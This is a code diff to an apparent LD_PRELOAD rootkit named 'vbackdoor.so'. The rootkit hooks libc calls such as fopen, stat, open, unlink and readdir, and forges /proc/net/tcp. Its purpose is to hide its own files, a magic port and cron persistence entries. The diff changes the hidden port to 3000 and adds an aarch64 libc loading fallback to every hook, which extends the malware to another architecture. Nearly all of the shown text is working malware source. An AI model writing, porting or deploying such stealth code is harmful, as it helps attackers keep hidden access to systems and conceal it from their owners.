@@ -20,7 +20,7 @@
 #define LIB_FILE "vbackdoor.so" // hide self
 #define CRONTAB_CODE1 "* * * * * root ping 8.8.8.8 \n" //add cron /etc/cron.d/root
 #define CRONTAB_CODE2 "* * * * * ping 8.8.8.8 \n" //add cron /var/spool/cron/root /var/spool/cron/crontabs/root
-#define MAGIC_PORT 2222 // hide port
+#define MAGIC_PORT 3000 // hide port
 
 void *libc;
 
@@ -90,6 +90,8 @@ static struct dirent64 *(*old_readdir64) (DIR * dir);
 void __attribute ((constructor)) init (void)
 {
     if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -102,6 +104,7 @@ void __attribute ((constructor)) init (void)
         }
     }
 }
+}
 FILE * forge_proc_net_tcp (const char *filename)
 {
   char line[LINE_MAX];
@@ -111,6 +114,8 @@ FILE * forge_proc_net_tcp (const char *filename)
   char rem_addr[128], local_addr[128], more[512];
     
   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -121,7 +126,8 @@ FILE * forge_proc_net_tcp (const char *filename)
                 }
             }
         }
-  }
+    }
+}
     
   if (!old_fopen)
     old_fopen = dlsym (libc, "fopen");
@@ -157,7 +163,9 @@ FILE * forge_proc_net_tcp (const char *filename)
 int
 access (const char *path, int amode)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -168,7 +176,8 @@ access (const char *path, int amode)
                 }
             }
         }
-  }
+    }
+}
   if(!old_access){
     old_access = dlsym (libc, "access");
     FILE *fpa = NULL;
@@ -215,7 +224,9 @@ access (const char *path, int amode)
 
 FILE * fopen (const char *filename, const char *mode)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -226,7 +237,8 @@ FILE * fopen (const char *filename, const char *mode)
                 }
             }
         }
-  }
+    }
+}
   if (!old_fopen)
     old_fopen = dlsym (libc, "fopen");
     
@@ -247,7 +259,9 @@ FILE * fopen (const char *filename, const char *mode)
 
 FILE * fopen64 (const char *filename, const char *mode)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -258,7 +272,8 @@ FILE * fopen64 (const char *filename, const char *mode)
                 }
             }
         }
-  }
+    }
+}
   if (!old_fopen64)
     old_fopen64 = dlsym (libc, "fopen64");
     
@@ -279,7 +294,9 @@ FILE * fopen64 (const char *filename, const char *mode)
 
 int lstat (const char *file, struct stat *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -290,7 +307,8 @@ int lstat (const char *file, struct stat *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_lxstat == NULL)
     old_lxstat = dlsym (libc, "__lxstat");
 
@@ -304,7 +322,9 @@ int lstat (const char *file, struct stat *buf)
 
 int lstat64 (const char *file, struct stat64 *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -315,7 +335,8 @@ int lstat64 (const char *file, struct stat64 *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_lxstat64 == NULL)
     old_lxstat64 = dlsym (libc, "__lxstat64");
 
@@ -329,7 +350,9 @@ int lstat64 (const char *file, struct stat64 *buf)
 
 int __lxstat (int ver, const char *file, struct stat *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -340,7 +363,8 @@ int __lxstat (int ver, const char *file, struct stat *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_lxstat == NULL)
     old_lxstat = dlsym (libc, "__lxstat");
 
@@ -354,7 +378,9 @@ int __lxstat (int ver, const char *file, struct stat *buf)
 
 int __lxstat64 (int ver, const char *file, struct stat64 *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -365,7 +391,8 @@ int __lxstat64 (int ver, const char *file, struct stat64 *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_lxstat64 == NULL)
     old_lxstat64 = dlsym (libc, "__lxstat64");
 
@@ -379,7 +406,9 @@ int __lxstat64 (int ver, const char *file, struct stat64 *buf)
 
 int open (const char *pathname, int flags, mode_t mode)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -390,7 +419,8 @@ int open (const char *pathname, int flags, mode_t mode)
                 }
             }
         }
-  }
+    }
+}
   if (old_open == NULL)
     old_open = dlsym (libc, "open");
 
@@ -407,7 +437,9 @@ int open (const char *pathname, int flags, mode_t mode)
 
 int rmdir (const char *pathname)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -418,7 +450,8 @@ int rmdir (const char *pathname)
                 }
             }
         }
-  }
+    }
+}
   if (old_rmdir == NULL)
     old_rmdir = dlsym (libc, "rmdir");
 
@@ -436,6 +469,8 @@ int rmdir (const char *pathname)
 int stat (const char *path, struct stat *buf)
 {
   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -446,7 +481,8 @@ int stat (const char *path, struct stat *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_xstat == NULL)
     old_xstat = dlsym (libc, "__xstat");
 
@@ -460,7 +496,9 @@ int stat (const char *path, struct stat *buf)
 
 int stat64 (const char *path, struct stat64 *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -471,7 +509,8 @@ int stat64 (const char *path, struct stat64 *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_xstat64 == NULL)
     old_xstat64 = dlsym (libc, "__xstat64");
 
@@ -484,7 +523,9 @@ int stat64 (const char *path, struct stat64 *buf)
 
 int __xstat (int ver, const char *path, struct stat *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -495,7 +536,8 @@ int __xstat (int ver, const char *path, struct stat *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_xstat == NULL)
     old_xstat = dlsym (libc, "__xstat");
 
@@ -509,7 +551,9 @@ int __xstat (int ver, const char *path, struct stat *buf)
 
 int __xstat64 (int ver, const char *path, struct stat64 *buf)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -520,7 +564,8 @@ int __xstat64 (int ver, const char *path, struct stat64 *buf)
                 }
             }
         }
-  }
+    }
+}
   if (old_xstat64 == NULL)
     old_xstat64 = dlsym (libc, "__xstat64");
 
@@ -534,7 +579,9 @@ int __xstat64 (int ver, const char *path, struct stat64 *buf)
 
 int unlink (const char *pathname)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -545,7 +592,8 @@ int unlink (const char *pathname)
                 }
             }
         }
-  }
+    }
+}
   if (old_unlink == NULL)
     old_unlink = dlsym (libc, "unlink");
 
@@ -562,7 +610,9 @@ int unlink (const char *pathname)
 
 int unlinkat (int dirfd, const char *pathname, int flags)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -573,7 +623,8 @@ int unlinkat (int dirfd, const char *pathname, int flags)
                 }
             }
         }
-  }
+    }
+}
   if (old_unlinkat == NULL)
     old_unlinkat = dlsym (libc, "unlinkat");
 
@@ -587,7 +638,9 @@ int unlinkat (int dirfd, const char *pathname, int flags)
 
 DIR * opendir (const char *name)
 {
-  if (!libc){
+   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -598,7 +651,8 @@ DIR * opendir (const char *name)
                 }
             }
         }
-  }
+    }
+}
   if (old_opendir == NULL)
     old_opendir = dlsym (libc, "opendir");
 
@@ -617,6 +671,8 @@ struct dirent * readdir (DIR * dirp)
 {
   struct dirent *dir;
   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -627,7 +683,8 @@ struct dirent * readdir (DIR * dirp)
                 }
             }
         }
-  }
+    }
+}
   if (!old_readdir)
     old_readdir = dlsym (libc, "readdir");
 
@@ -658,6 +715,8 @@ struct dirent64 * readdir64 (DIR * dirp)
   struct dirent64 *dir;
 
   if (!libc){
+    libc = dlopen ("/lib/aarch64-linux-gnu/libc.so.6", RTLD_LAZY);
+    if (!libc){
         libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
         if (!libc){
             libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
@@ -668,7 +727,8 @@ struct dirent64 * readdir64 (DIR * dirp)
                 }
             }
         }
-  }
+    }
+}
   if (!old_readdir64)
     old_readdir64 = dlsym (libc, "readdir64");
 
